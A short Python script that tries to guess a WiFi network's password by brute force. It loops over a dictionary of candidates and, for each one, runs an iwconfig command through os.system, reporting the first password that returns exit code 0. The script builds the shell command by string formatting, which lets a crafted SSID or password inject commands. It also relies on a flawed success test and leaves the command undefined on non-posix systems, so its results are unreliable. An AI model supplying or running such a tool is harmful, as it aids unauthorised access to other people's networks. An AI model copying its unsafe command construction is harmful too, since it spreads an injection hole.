import os

def WifiConnect(ssid, Dictionary):

    for password in Dictionary:
        if os.name == "posix":
            command = "iwconfig wlan0 essid {} key s:{}".format(ssid, password)

        exit_code = os.system(command)

        if exit_code == 0:
            print("Successfully connected to WiFi network with password: {}".format(password))
            return password
        else:
            print("Failed to connect to WiFi network with password: {}".format(password))

    return "Unable to find the password within the dictionary"